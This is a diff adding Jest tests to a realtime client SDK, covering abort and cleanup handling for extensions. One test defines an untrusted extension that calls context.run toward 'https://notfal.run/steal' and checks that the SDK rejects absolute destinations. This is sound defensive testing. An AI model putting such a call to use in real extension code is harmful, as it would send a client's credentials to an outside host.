@@ -189,6 +189,32 @@ describe("realtime extensions", () => {
     expect(close).toHaveBeenCalledTimes(1);
   });
 
+  it("contains a rejecting session close hook during abort", async () => {
+    const controller = new AbortController();
+    const close = jest.fn().mockRejectedValue(new Error("close failed"));
+    const brokenClose = defineRealtimeExtension<
+      { endpointId?: string },
+      RealtimeSession
+    >({
+      id: "test/broken-close",
+      defaultEndpoint: "test/broken-close",
+      async open() {
+        return { close };
+      },
+    });
+    const client = createRealtimeClient({
+      config: createConfig({ credentials: "test-key" }),
+    });
+    const session = await client.open(brokenClose, {
+      abortSignal: controller.signal,
+    });
+
+    controller.abort(new Error("user left"));
+
+    await expect(session.close()).resolves.toBeUndefined();
+    expect(close).toHaveBeenCalledTimes(1);
+  });
+
   it.each([
     [
       "throws",
@@ -226,6 +252,55 @@ describe("realtime extensions", () => {
 
     await expect(opening).rejects.toBe(reason);
     await Promise.resolve();
+  });
+
+  it("awaits an asynchronous cleanup registered after abort", async () => {
+    const controller = new AbortController();
+    const reason = new Error("user left");
+    let finishSetup = () => undefined;
+    let finishCleanup = () => undefined;
+    const setup = new Promise<void>((resolve) => {
+      finishSetup = resolve;
+    });
+    const cleanupDone = new Promise<void>((resolve) => {
+      finishCleanup = resolve;
+    });
+    const cleanup = jest.fn(() => cleanupDone);
+    const late = defineRealtimeExtension<
+      { endpointId?: string },
+      RealtimeSession
+    >({
+      id: "test/await-late-cleanup",
+      defaultEndpoint: "test/await-late-cleanup",
+      async open(context) {
+        await setup;
+        context.addCleanup(cleanup);
+        return { close: jest.fn() };
+      },
+    });
+    const client = createRealtimeClient({
+      config: createConfig({ credentials: "test-key" }),
+    });
+
+    const opening = client.open(late, { abortSignal: controller.signal });
+    let settled = false;
+    void opening.then(
+      () => {
+        settled = true;
+      },
+      () => {
+        settled = true;
+      },
+    );
+    controller.abort(reason);
+    finishSetup();
+    await Promise.resolve();
+    await Promise.resolve();
+
+    expect(cleanup).toHaveBeenCalledTimes(1);
+    expect(settled).toBe(false);
+    finishCleanup();
+    await expect(opening).rejects.toBe(reason);
   });
 
   it("preserves the caller's abort reason while an extension is opening", async () => {
@@ -278,6 +353,27 @@ describe("realtime extensions", () => {
 });
 
 describe("realtime extension context additions", () => {
+  it("context.run rejects absolute destinations", async () => {
+    const client = createRealtimeClient({
+      config: createConfig({ credentials: "secret-key" }),
+    });
+    const probe = defineRealtimeExtension<
+      Record<string, never>,
+      RealtimeSession
+    >({
+      id: "test/untrusted-run",
+      defaultEndpoint: "test/untrusted-run",
+      async open(context) {
+        await context.run("https://notfal.run/steal", { input: {} });
+        return { close: jest.fn() };
+      },
+    });
+
+    await expect(client.open(probe, {})).rejects.toThrow(
+      "requires an app endpoint id",
+    );
+  });
+
   it("context.fetch attaches the parent client's credentials", async () => {
     // The point of this method existing: the extension makes the call, so the APPLICATION never has
     // to inject a credentialed fetch and never handles a key.
